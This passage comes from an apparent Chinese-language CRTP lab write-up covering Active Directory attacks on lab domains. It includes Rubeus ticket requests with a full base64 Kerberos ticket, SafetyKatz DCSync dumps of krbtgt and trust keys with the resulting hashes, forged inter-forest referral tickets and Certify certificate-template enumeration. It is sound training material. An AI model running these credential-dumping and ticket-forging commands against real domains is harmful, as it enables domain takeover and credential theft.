class="number">6</span>/<span class="number">3</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">09</span>:<span class="number">15</span> AM</span><br><span class="line"></span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"></span><br><span class="line">      doIF7jCCBeqgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOCBFYwggRSoAMCARehAwIBA6KCBEQEggRAvPrPtk3ICRORR+oK9xg7MaA9tHdBMCJVLUYR+JE+n+JYsJV0mc35CE4q5YbTQWKQh/QDh6rvZ0tFtWbDYGQtXqQs3prJCjv5fb4U9cKew1x58B9XBYfeAbk5xLVLHlUVFusLpCmzy1o7WKAbqKADznuIDwnh+<span class="number">9</span>oPa0CNQc+iZ2aEGEAxpPg93G1qOMa+<span class="number">46</span>a7g13TYSZ+a7S3MUAj85YHdTUTk2xlAvTEuoUPKG/QXboIDWTyT5jtoDy6nuZVR9XpmyjkNahshBQ10JjaMrBabqRzTpigg7u7SIwaAXGfOtOHoEanJu6FwondrJVjz5KHJrZGxAswc2WA2Wl/LL9pHisD2axmrocuJTJRQd23G7UCxOLqR0mvopyQYd/kmVUZdDJu2xV+A6/q2BvQzn/fqdTYppm7VEy3ZFJfwTuMuC66LkTnXlMx1ZnwweFwHznmd5OO5f7HeiGMCiAzU2VbE/<span class="number">1</span>vOOcHk/JPVQQ04xUANBX0KqRG20ANwDe17grPHguTarRFEA5PAVY8b6dC0YX9EK6BV7IVvb2t8Td6TsHnM/ANj9/jxmY7ZPLcC9z9BhDr3PF/lVrpWClAlF9wkHjvf3aU+mIi0Wdm1/<span class="number">4</span>CZOIVlL8kDX8hcJXCk/AdWmwIGw5VRbXnoNgVaWftonTfR7dDUg2Lo/B0NSy9somFTxI1t9aL+xIsCzJr94tNl0pVvdz7K4SCaJpo52XYzrxFj3uD32VbuK7WeW8fDnfb+nZ8OV/AlTEThyTZ1sYcbbNasiSGwfOpukomTFL0iFhGy7QR9/LGyK0vPbkZGPHdnkMPNkg0ClMpVvdVHy4RmjI5f/<span class="number">9</span>ngPxXiTwnYbl+r5yyDRH8IMiKLMfSLRHrCo6m8eyODkTa/jkKPXk6A7OsQazcmQID9OLYp1l2IorQc+WpJy9tl+/Sj72NrTIdMbeUEiO6DyCj9dscr3CIkIb1B0xR4uiY2iwm1fWsQnKC761vABJarfEdYf5hecIZYVhTOpPINyqkokdZcnyctfoYWtcrxlVR2tAl8mJoq8YiUNb1LYziZQ5e5wJ/fmsiNKqNN5FyQVT8cFbV06sNQTjONw0jr0ndgqg5X23XcDRDmsqLCSoVjEUG1DU+gsrhJSzPVCf2viNCubity6vfHy92UKdm9ZFIiq0qjoHXRdL2OD/OJNRkoj5AJCK3q4s6svZhZC8ftsMtQ7ZjU0qZwCnDxfs1qj9OhGL8Oaz6xlZCvUhbzupHFz7yj2eud7JHHeIYdxfED5Hw2/<span class="number">8</span>dzJMZV8KBU9a9HfeH0<span class="built_in">ft</span>+Z33je4IoDDSkQ3QEUgpwhCxjaFIMQLab+<span class="number">6</span>BQfBdsA4urS/oPlO1qxhYufcFb6qrNxuzpAzSaUihIZxw4bYCNt7tzYSKhdaiu/hnJJFyDTPqe0ger6QkPvTzaVL9V9+<span class="number">7</span>aRGQZcDgOx2Tvw5DgDfcr9b2wz/Ky2W4zuurCUcKjggEeMIIBGqADAgEAooIBEQSCAQ19ggEJMIIBBaCCAQEwgf4wgfugGzAZoAMCARehEgQQlG5O4qhtBQPk+aTa3Fxan6EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyNTA1MjcxNzA5MTVapREYDzIwMjUwNTI3MTcwOTE1WqYRGA8yMDI1MDUyODAzMDkxNVqnERgPMjAyNTA2MDMxNzA5MTVaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbA==</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Ticket successfully imported!</span><br></pre></td></tr></table></figure>

<p>这里直接拿着注入了票据去请求mcorp-dc的话是不行的。</p>
<p>还需要再去和父域的域控请求服务的tgs票据（废话</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\Loader.exe <span class="literal">-path</span> .\Rubeus.exe <span class="literal">-args</span> asktgs /service:ldap/mcorp<span class="literal">-dc</span>.moneycorp.local  /dc:mcorp<span class="literal">-dc</span>.moneycorp.local /ticket:doIF7jCCBeqgAwIBBaEDAgEWooIEujCCBLZhggSyMIIErqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbKOCBFYwggRSoAMCARehAwIBA6KCBEQEggRAvPrPtk3ICRORR+oK9xg7MaA9tHdBMCJVLUYR+JE+n+JYsJV0mc35CE4q5YbTQWKQh/QDh6rvZ0tFtWbDYGQtXqQs3prJCjv5fb4U9cKew1x58B9XBYfeAbk5xLVLHlUVFusLpCmzy1o7WKAbqKADznuIDwnh+<span class="number">9</span>oPa0CNQc+iZ2aEGEAxpPg93G1qOMa+<span class="number">46</span>a7g13TYSZ+a7S3MUAj85YHdTUTk2xlAvTEuoUPKG/QXboIDWTyT5jtoDy6nuZVR9XpmyjkNahshBQ10JjaMrBabqRzTpigg7u7SIwaAXGfOtOHoEanJu6FwondrJVjz5KHJrZGxAswc2WA2Wl/LL9pHisD2axmrocuJTJRQd23G7UCxOLqR0mvopyQYd/kmVUZdDJu2xV+A6/q2BvQzn/fqdTYppm7VEy3ZFJfwTuMuC66LkTnXlMx1ZnwweFwHznmd5OO5f7HeiGMCiAzU2VbE/<span class="number">1</span>vOOcHk/JPVQQ04xUANBX0KqRG20ANwDe17grPHguTarRFEA5PAVY8b6dC0YX9EK6BV7IVvb2t8Td6TsHnM/ANj9/jxmY7ZPLcC9z9BhDr3PF/lVrpWClAlF9wkHjvf3aU+mIi0Wdm1/<span class="number">4</span>CZOIVlL8kDX8hcJXCk/AdWmwIGw5VRbXnoNgVaWftonTfR7dDUg2Lo/B0NSy9somFTxI1t9aL+xIsCzJr94tNl0pVvdz7K4SCaJpo52XYzrxFj3uD32VbuK7WeW8fDnfb+nZ8OV/AlTEThyTZ1sYcbbNasiSGwfOpukomTFL0iFhGy7QR9/LGyK0vPbkZGPHdnkMPNkg0ClMpVvdVHy4RmjI5f/<span class="number">9</span>ngPxXiTwnYbl+r5yyDRH8IMiKLMfSLRHrCo6m8eyODkTa/jkKPXk6A7OsQazcmQID9OLYp1l2IorQc+WpJy9tl+/Sj72NrTIdMbeUEiO6DyCj9dscr3CIkIb1B0xR4uiY2iwm1fWsQnKC761vABJarfEdYf5hecIZYVhTOpPINyqkokdZcnyctfoYWtcrxlVR2tAl8mJoq8YiUNb1LYziZQ5e5wJ/fmsiNKqNN5FyQVT8cFbV06sNQTjONw0jr0ndgqg5X23XcDRDmsqLCSoVjEUG1DU+gsrhJSzPVCf2viNCubity6vfHy92UKdm9ZFIiq0qjoHXRdL2OD/OJNRkoj5AJCK3q4s6svZhZC8ftsMtQ7ZjU0qZwCnDxfs1qj9OhGL8Oaz6xlZCvUhbzupHFz7yj2eud7JHHeIYdxfED5Hw2/<span class="number">8</span>dzJMZV8KBU9a9HfeH0<span class="built_in">ft</span>+Z33je4IoDDSkQ3QEUgpwhCxjaFIMQLab+<span class="number">6</span>BQfBdsA4urS/oPlO1qxhYufcFb6qrNxuzpAzSaUihIZxw4bYCNt7tzYSKhdaiu/hnJJFyDTPqe0ger6QkPvTzaVL9V9+<span class="number">7</span>aRGQZcDgOx2Tvw5DgDfcr9b2wz/Ky2W4zuurCUcKjggEeMIIBGqADAgEAooIBEQSCAQ19ggEJMIIBBaCCAQEwgf4wgfugGzAZoAMCARehEgQQlG5O4qhtBQPk+aTa3Fxan6EcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIaMBigAwIBAaERMA8bDWFkbWluaXN0cmF0b3KjBwMFAECgAACkERgPMjAyNTA1MjcxNzA5MTVapREYDzIwMjUwNTI3MTcwOTE1WqYRGA8yMDI1MDUyODAzMDkxNVqnERgPMjAyNTA2MDMxNzA5MTVaqBwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMqS8wLaADAgECoSYwJBsGa3JidGd0Gxpkb2xsYXJjb3JwLm1vbmV5Y29ycC5sb2NhbA== /ptt</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-69.png" alt="alt text"></p>
<p>这里我请求的ldap的所以就可以对mcorp-dc做dcsync了，http也可以，虽然他没显示http就是了</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Loader.exe <span class="literal">-path</span> .\SafetyKatz.exe <span class="literal">-args</span> <span class="string">&quot;lsadump::evasive-dcsync /domain:moneycorp.local /user:mcorp\krbtgt&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-70.png" alt="alt text"></p>
<p>aes256key <code>90ec02cc0396de7e08c7d5a163c21fd59fcb9f8163254f9775fc2604b9aedb5e</code></p>
<p>得到flag <code>a0981492d5dfab1ae0b97b51ea895ddf</code> </p>
<h2 id="Learning-Objective-20-1"><a href="#Learning-Objective-20-1" class="headerlink" title="Learning Objective - 20 - 1"></a>Learning Objective - 20 - 1</h2><blockquote>
<p>Service for which a TGS is requested from eurocorp-dc</p>
</blockquote>
<blockquote>
<p>可以从eurocorp-dc请求哪一个服务的TGS</p>
</blockquote>
<p>要先枚举一下域信任关系，因为forest里没能看到这个林</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-DomainTrust</span></span><br><span class="line"></span><br><span class="line">SourceName      : dollarcorp.moneycorp.local</span><br><span class="line">TargetName      : moneycorp.local</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">5</span>:<span class="number">59</span>:<span class="number">01</span> AM</span><br><span class="line">WhenChanged     : <span class="number">5</span>/<span class="number">15</span>/<span class="number">2025</span> <span class="number">9</span>:<span class="number">00</span>:<span class="number">51</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : dollarcorp.moneycorp.local</span><br><span class="line">TargetName      : us.dollarcorp.moneycorp.local</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : WITHIN_FOREST</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">6</span>:<span class="number">22</span>:<span class="number">51</span> AM</span><br><span class="line">WhenChanged     : <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">15</span>:<span class="number">07</span> PM</span><br><span class="line"></span><br><span class="line">SourceName      : dollarcorp.moneycorp.local</span><br><span class="line">TargetName      : eurocorp.local</span><br><span class="line">TrustType       : WINDOWS_ACTIVE_DIRECTORY</span><br><span class="line">TrustAttributes : FILTER_SIDS</span><br><span class="line">TrustDirection  : Bidirectional</span><br><span class="line">WhenCreated     : <span class="number">11</span>/<span class="number">12</span>/<span class="number">2022</span> <span class="number">8</span>:<span class="number">15</span>:<span class="number">23</span> AM</span><br><span class="line">WhenChanged     : <span class="number">5</span>/<span class="number">26</span>/<span class="number">2025</span> <span class="number">10</span>:<span class="number">15</span>:<span class="number">06</span> PM</span><br></pre></td></tr></table></figure>

<p>看到有个 <code>eurocorp.local</code>，但是<code>TrustAttributes</code>是 <code>filter_sid</code>也就是会过滤掉sid history中出现sid 500-1000的这部分。</p>
<p>有sid过滤这通常也就意味着 <code>eurocorp.local</code> 是<strong>外部信任林域</strong></p>
<p>然后枚举一下这个林域的根域<code>eurocorp.local</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-Domain</span> <span class="literal">-Domain</span> eurocorp.local</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Forest                  : eurocorp.local</span><br><span class="line">DomainControllers       : &#123;eurocorp<span class="literal">-dc</span>.eurocorp.local&#125;</span><br><span class="line">Children                : &#123;eu.eurocorp.local&#125;</span><br><span class="line">DomainMode              : Unknown</span><br><span class="line">DomainModeLevel         : <span class="number">7</span></span><br><span class="line">Parent                  :</span><br><span class="line">PdcRoleOwner            : eurocorp<span class="literal">-dc</span>.eurocorp.local</span><br><span class="line">RidRoleOwner            : eurocorp<span class="literal">-dc</span>.eurocorp.local</span><br><span class="line">InfrastructureRoleOwner : eurocorp<span class="literal">-dc</span>.eurocorp.local</span><br><span class="line">Name                    : eurocorp.local</span><br></pre></td></tr></table></figure>

<p>能看到还有个 <code>eu.eurocorp.local</code> 子域名</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\AD\Tools&gt; <span class="built_in">Get-Domaincomputer</span> <span class="literal">-Domain</span> eurocorp.local|<span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">EUROCORP<span class="literal">-DC</span></span><br></pre></td></tr></table></figure>

<p>好在里面就一个机器 即<code>EUROCORP-DC</code></p>
<p>然后获取跨域账户的跨域密钥</p>
<p>再枚举一下跨域账户，看起来是ecorp$</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; <span class="built_in">Get-DomainObject</span>|?&#123;<span class="variable">$_</span>.samaccounttype <span class="operator">-match</span> <span class="string">&quot;TRUST_ACCOUNT&quot;</span>&#125;|<span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">ecorp<span class="variable">$</span></span><br><span class="line">mcorp<span class="variable">$</span></span><br><span class="line">US<span class="variable">$</span></span><br></pre></td></tr></table></figure>

<p>然后通过da权限导一下域信任密钥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\loader -path .\SafetyKatz.exe -args &quot;lsadump::evasive-dcsync /user:dcorp\ecorp$&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ef718ae6bfca0f24a7ea549f2f57ec55</span><br></pre></td></tr></table></figure>

<p>伪造一张referral tgt，注意伪造的是当前域的DA用户</p>
<p><strong>伪造时候要注意，是本域krbtgt服务下发这张跨域TGT票</strong></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\Loader.exe <span class="literal">-path</span> C:\AD\Tools\Rubeus.exe <span class="literal">-args</span> evasive<span class="literal">-silver</span> /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:ef718ae6bfca0f24a7ea549f2f57ec55 /sid:S<span class="literal">-1-5-21-719815819-3726368948-3917688648</span> /ldap /user:Administrator /nowrap</span><br></pre></td></tr></table></figure>

<p>然后拿着referral TGT去请求跨域机器的服务TGS，<strong>可以通过更改service不断重复这一步来枚举跨域目标的服务。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:doIFxjCC</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2025/crtp-lab-note/image-72.png" alt="alt text"></p>
<p>拿到 TGS 后，还需要手动再确认能否访问资源。</p>
<p><strong>这里因为通过lab手册里已经预先知道了DA用户有权限访问cifs下的一个共享目录，所以才直接获取cifs票据然后发起对ecorp-dc访问，正常情况下只能挨个服务枚举TGS，然后再连接尝试。</strong></p>
<h2 id="Learning-Objective-20-2"><a href="#Learning-Objective-20-2" class="headerlink" title="Learning Objective - 20 - 2"></a>Learning Objective - 20 - 2</h2><blockquote>
<p>Contents of secret.txt on eurocorp-dc</p>
</blockquote>
<blockquote>
<p>访问eurocorp-dc的secret.txt文件</p>
</blockquote>
<p><img src="/wpimages/2025/crtp-lab-note/image-73.png" alt="alt text"></p>
<p>尝试访问目录，然后这里只有 <code>SharedwithDCorp</code> 有权限访问</p>
<p><img src="/wpimages/2025/crtp-lab-note/image-74.png" alt="alt text"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\AD\Tools&gt;<span class="built_in">type</span> \\eurocorp<span class="literal">-dc</span>.eurocorp.local\SharedwithDCorp\secret.txt</span><br><span class="line">Dollarcorp DAs can read this!</span><br></pre></td></tr></table></figure>

<p>flag 为 &#96;Dollarcorp DAs can read this!</p>
<h2 id="Learning-Objective-21-1"><a href="#Learning-Objective-21-1" class="headerlink" title="Learning Objective - 21 - 1"></a>Learning Objective - 21 - 1</h2><blockquote>
<p>Name of the AD CS template that has ENROLLEE_SUPPLIES_SUBJECT</p>
</blockquote>
<blockquote>
<p>带有ENROLLEE_SUPPLIES_SUBJECT字段的ADCS证书模板名字</p>
</blockquote>
<p>要枚举adcs模板了，先看下adcs</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\ad\tools&gt; .\Certify.exe cas</span><br><span class="line"></span><br><span class="line">   _____          _   _  __</span><br><span class="line">  / ____|        | | (_)/ _|</span><br><span class="line"> | |     ___ _ __| |_ _| |_ _   _</span><br><span class="line"> | |    / _ \ <span class="string">&#x27;__| __| |  _| | | |</span></span><br><span class="line"><span class="string"> | |___|  __/ |  | |_| | | | |_| |</span></span><br><span class="line"><span class="string">  \_____\___|_|   \__|_|_|  \__, |</span></span><br><span class="line"><span class="string">                             __/ |</span></span><br><span class="line"><span class="string">                            |___./</span></span><br><span class="line"><span class="string">  v1.1.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Action: Find certificate authorities</span></span><br><span class="line"><span class="string">[*] Using the search base &#x27;</span>CN=Configuration,DC=moneycorp,DC=local<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Root CAs</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local</span></span><br><span class="line"><span class="string">    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span></span><br><span class="line"><span class="string">    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49</span></span><br><span class="line"><span class="string">    Cert Start Date               : 11/26/2022 1:59:16 AM</span></span><br><span class="line"><span class="string">    Cert End Date                 : 11/26/2032 2:09:15 AM</span></span><br><span class="line"><span class="string">    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] NTAuthCertificates - Certificates that enable authentication:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local</span></span><br><span class="line"><span class="string">    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span></span><br><span class="line"><span class="string">    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49</span></span><br><span class="line"><span class="string">    Cert Start Date               : 11/26/2022 1:59:16 AM</span></span><br><span class="line"><span class="string">    Cert End Date                 : 11/26/2032 2:09:15 AM</span></span><br><span class="line"><span class="string">    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Enterprise/Enrollment CAs:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Enterprise CA Name            : moneycorp-MCORP-DC-CA</span></span><br><span class="line"><span class="string">    DNS Hostname                  : mcorp-dc.moneycorp.local</span></span><br><span class="line"><span class="string">    FullName                      : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA</span></span><br><span class="line"><span class="string">    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED</span></span><br><span class="line"><span class="string">    Cert SubjectName              : CN=moneycorp-MCORP-DC-CA, DC=moneycorp, DC=local</span></span><br><span class="line"><span class="string">    Cert Thumbprint               : 8DA9C3EF73450A29BEB2C77177A5B02D912F7EA8</span></span><br><span class="line"><span class="string">    Cert Serial                   : 48D51C5ED50124AF43DB7A448BF68C49</span></span><br><span class="line"><span class="string">    Cert Start Date               : 11/26/2022 1:59:16 AM</span></span><br><span class="line"><span class="string">    Cert End Date                 : 11/26/2032 2:09:15 AM</span></span><br><span class="line"><span class="string">    Cert Chain                    : CN=moneycorp-MCORP-DC-CA,DC=moneycorp,DC=local</span></span><br><span class="line"><span class="string">    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!</span></span><br><span class="line"><span class="string">    CA Permissions                :</span></span><br><span class="line"><span class="string">      Owner: BUILTIN\Administrators        S-1-5-32-544</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Access Rights                                     Principal</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11</span></span><br><span class="line"><span class="string">      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544</span></span><br><span class="line"><span class="string">      Allow  ManageCA, ManageCertificates               mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512</span></span><br><span class="line"><span class="string">      Allow  ManageCA, ManageCertificates               mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</span></span><br><span class="line"><span class="string">    Enrollment Agent Restrictions : None</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Enabled Certificate Templates:</span></span><br><span class="line"><span class="string">        CA-Integration</span></span><br><span class="line"><span class="string">        HTTPSCertificates</span></span><br><span class="line"><span class="string">        SmartCardEnrollment-Agent</span></span><br><span class="line"><span class="string">        SmartCardEnrollment-Users</span></span><br><span class="line"><span class="string">        DirectoryEmailReplication</span></span><br><span class="line"><span class="string">        DomainControllerAuthentication</span></span><br><span class="line"><span class="string">        KerberosAuthentication</span></span><br><span class="line"><span class="string">        EFSRecovery</span></span><br><span class="line"><span class="string">        EFS</span></span><br><span class="line"><span class="string">        DomainController</span></span><br><span class="line"><span class="string">        WebServer</span></span><br><span class="line"><span class="string">        Machine</span></span><br><span class="line"><span class="string">        User</span></span><br><span class="line"><span class="string">        SubCA</span></span><br><span class="line"><span class="string">        Administrator</span></span><br></pre></td></tr></table></figure>

<p>然后枚举student账户能用的所有带有 <code>ENROLLEESUPPLIESSUBJECT</code> 字段的证书</p>
<p>···<br>.\Certify.exe find &#x2F;currentuser &#x2F;enrolleeSuppliesSubject</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中返回的这个证书模板符合当前用户能用+flag带有ENROLLEE_SUPPLIES_SUBJECT字段</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>CA Name                               : mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA<br>Template Name                         : HTTPSCertificates<br>Schema Version                        : 2<br>Validity Period                       : 10 years<br>Renewal Period                        : 6 weeks<br>msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT<br>mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS<br>Authorized Signatures Required        : 0<br>pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email<br>mspki-certificate-application-policy  : Client Authentication, Encrypting File System, Secure Email<br>Permissions<br>  Enrollment Permissions<br>    Enrollment Rights           : dcorp\RDPUsers                S-1-5-21-719815819-3726368948-3917688648-1123<br>                                  mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512<br>                                  mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519<br>  Object Control Permissions<br>    Owner                       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500<br>    WriteOwner Principals       : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500<br>                                  mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512<br>                                  mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519<br>    WriteDacl Principals        : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500<br>                                  mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512<br>                                  mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519<br>    WriteProperty Principals    : mcorp\Administrator           S-1-5-21-335606122-960912869-3279953914-500<br>                                  mcorp\Domain Admins           S-1-5-21-335606122-960912869-3279953914-512<br>                                  mcorp\Enterprise Admins       S-1-5-21-335606122-960912869-3279953914-519</p>
